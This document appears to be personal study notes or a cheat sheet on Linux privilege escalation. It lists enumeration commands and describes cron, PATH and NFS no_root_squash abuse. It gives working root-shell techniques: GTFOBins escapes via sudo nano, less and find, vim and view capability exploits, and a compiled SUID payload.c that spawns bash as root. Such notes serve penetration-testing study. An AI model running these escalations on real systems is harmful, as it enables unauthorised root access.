# Linux Previlege Escalation

## System Enumeration
### Basic Informations
```
hostname
uname -a
id
history
cat /proc/version #for kernel and gcc version
cat /etc/issue
cat /etc/passwd
```
### Process Informations
```
ps       #show processes in the current shell(session or terminal,eg.pts)
ps -A    #view all running processes regardless of in which the session they are running
ps axjf  #view process tree
pstree   #view process tree
```
```
ps aux
a - all processes on the system
u - display the user by which the process is launched
x - show processes that are not attached to a terminal
jf - display in tree like format 
```
### Environmental Variables
```
env
echo $PATH
```

### Network Informations

```
netstat -an
netstat -4anp
netstat -4lnp
netstat -at #tcp
netstat -au #udp
netstat -l #list listening ports
netstat -lt4
netstat -s #satistics
netstat -i #interface information
netstat -rn #routing table
netstat -4ano #o for display timers
```
```
ip addr show
ip -br -c addr show
ip route
ifconfig
ifconfig -a
```

### Finding Files

```
find / -mtime 10	#modified time in last 10 days
find / -atime 10	#accessed time in last 10 days
find / -cmin -60	#changed within last 60 mins
find / -amin -60	#access within last 60 mins
```
```
find / -size 50M	#find files with 50M size
find / -size +50M	#find files bigger than 50M size
find / -size -50M	#find files smaller than 50M size
```
```
find / -type d -writable 2>/dev/null		    #writable directories
find / -type d -perm -222 2>/dev/null		    #at least readable directories 
find / -type d -perm -o=w 2>/dev/null		    #directories that can be written by anyone at least
find / -type d -perm -o=x 2>/dev/null		    #world executable directories
find / -type f -perm -4000 2>/dev/null		  #files with suid permission
find / -type f -perm -u=s 2>/dev/null		    #files with suid permission
find / -type f -perm -4000 -ls 2>/dev/null  #files with suid permission (long listing)
```

### Automated Enumeration Tools

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

### Sudo Privileges

#### Checking For `sudo` Permissions
```
sudo -l
```
#### Leveraging LD_PRELOAD

reference to the [blog](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)

`random_num.c`
```
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
 
int main(){
  srand(time(NULL));
  int i = 10;
  while(i--) printf("%d\n",rand()%100);
  return 0;
}
```

`unrandom.c`
```
int rand(){
    return 42; //the most random number in the universe
}
```

```
gcc -shared -fPIC unrandom.c -o unrandom.so
```

```
LD_PRELOAD=$PWD/unrandom.so ./random_nums
```



#### Abusing `sudo` permission on `nano`
The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/nano/)
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

#### Abusing `sudo` permission on `less`
The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/less/)
```
sudo less /etc/profile
!/bin/sh
```

#### Abusing `sudo` permission on `find`
The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/find/)
```
sudo find . -exec /bin/sh \; -quit
```

### SUID and SGID

#### Finding Files with SUID/SGID Permissions
```
find / -type f -perm -4000 -ls 2>/dev/null #print suid files and also sgid fils
find / -type f -perm -2000 -ls 2>/dev/null #print only sgid files
```

#### SUID vs SGID 
```
SUID (SetUID):
        Octal value: 4000
        Binary representation: 10000000000
        Effect: When set on an executable file, the file is executed with the privileges of the file owner (rather than the user executing the file).

SGID (SetGID):
        Octal value: 2000
        Binary representation: 01000000000
        Effect:
            When set on an executable file, the file is executed with the privileges of the group that owns the file.
            When set on a directory, files created within the directory inherit the group ownership of the directory (rather than the primary group of the user creating the file).
```

#### Abusing SUID permission on `base64`

The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/base64/)
```
sudo install -m =xs $(which base64) .

LFILE=file_to_read
./base64 "$LFILE" | base64 --decode
```

### Capabilities in linux

In Linux, capabilities refer to a feature that allows fine-grained control over privileges traditionally associated with the superuser (root) account. They provide a way to delegate specific privileged operations to non-root users or processes, reducing the need for processes to run with full root privileges.

Capabilities were introduced to address certain limitations and security concerns associated with the traditional Unix model of privilege escalation using the setuid mechanism (where an executable runs with the privileges of the file owner).

For example, the following command set the capability `cap_net_raw` permit on the `/bin/ping`.
```
sudo setcap cap_net_raw=p /bin/ping
```

Available capabilities can be check by either one of these commands below
```
man capabilities | grep -E "^\s*CAP_"
man capabilities | grep -E "^\s{7}CAP_"
man capabilities | grep -Ec "^\s{7}CAP_"
```

#### Listing Capabilities Set in the System

```
getcap -r / 2>/dev/null
```

#### Abusing the Capability set on `vim`
```
/path/to/vim = cap_setuid+ep
```
The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/vim/)
```
cp $(which vim) .
sudo setcap cap_setuid+ep vim

./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
Be sure to change `py` to `py3` if the target system is running on python3.

#### Abusing the Capability set on `vim`
```
/path/to/view = cap_setuid+ep
```
The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/view/)
```
cp $(which view) .
sudo setcap cap_setuid+ep view

./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
Be sure to change `py` to `py3` if the target system is running on python3.

### Cron Jobs

Cron jobs run processes with the privilege of their owners and not the current user.
To view cron jobs configured on the system.
```
cat /etc/crontab
```
We can hijack one of these processes configured in the `contab` if we can edit the `$PATH` environmental variable by putting an executable script with the same name as the one in the `crontab` file inside directory of our choice added to `$PATH`.


### `$PATH`

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script
```
echo $PATH
export PATH=/tmp:$PATH
```

1.What folders are located under $PATH
2.Does your current user have write privileges for any of these folders?
3.Can you modify $PATH?
4.Is there a script/application you can start that will be affected by this vulnerability?

### NFS Misconfiguration (`no_root_squash`)

#### NFS Enumeration
```
showmount -e <ip_addr>
```
#### Mounting NFS
```
mkdir /mnt/share
mount -t nfs <ip_addr>:/home /mnt/share -nolock
or
mount -o rw 10.0.2.12:/backups /mnt/share
```
- `-nolock` disables file locking
- The purpose of file locking is to prevent data corruption or conflicts that can occur when multiple clients try to modify the same file simultaneously.
- File locking is a mechanism used by applications to coordinate access to shared files. When a client process wants to modify a file, it can request a lock on that file.
- With file locking enabled, if a client process has obtained an exclusive lock (write lock) on a file, other processes or clients attempting to access or modify the same file will be blocked until the lock is released.

#### Root Squashing

- Root squashing means that if the root user (UID 0) on a client machine accesses files on an NFS share, the NFS server will map this access to a less privileged user, often `nfsnobody` or another specified non-privileged user.
- Root squashing is designed to prevent the potential security risks associated with allowing unrestricted root access to NFS shares
- By default, NFS will change the root user to `nfsnobody` and "strip" any file from operating with root privileges.
- When the `no_root_squash` option is used on an NFS share, it disables root squashing. This means that if the root user on a client accesses files on this share, the NFS server will allow the access with full root privileges

- When you have write access (rw) to an NFS share that has `no_root_squash` enabled, you can potentially upload and execute malicious binaries with elevated privileges.
- For example, an attacker could create an executable file with the SetUID (SUID) bit set on their local machine.
- The attacker then copies this executable to the NFS share (which has `no_root_squash` enabled) where they have write permissions.
- Because `no_root_squash` is active, the NFS server will not "strip" the SUID bit when the root user's privileges are mapped.
- When the SUID executable is executed on the NFS client (target system), it runs with the effective privileges of the root user, potentially allowing the attacker to escalate their privileges on the target system.

#### Creating an exploit with SUID bit

Creating `payload.c`
```
#include <unistd.h> //setgid(),setuid()
#include <stdlib.h> //system()
int main(){
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}
```

Compiling `payload.c` and set the binary `suid` bit
```
gcc -o payload payload.c
chmod +s payload
```

### Privilege Escalation Vectors
```
[sudo] env_keep+=LD_PRELOAD
[sudo] find
[sudo] nano
[sudo] less

[suid] systemd
[suid] base64

[cap] vim cap_setuid+ep
[cap] view cap_setuid+ep 

Cron Jobs
$PATH
NFS misconfiguration (no_root_squash)
```



















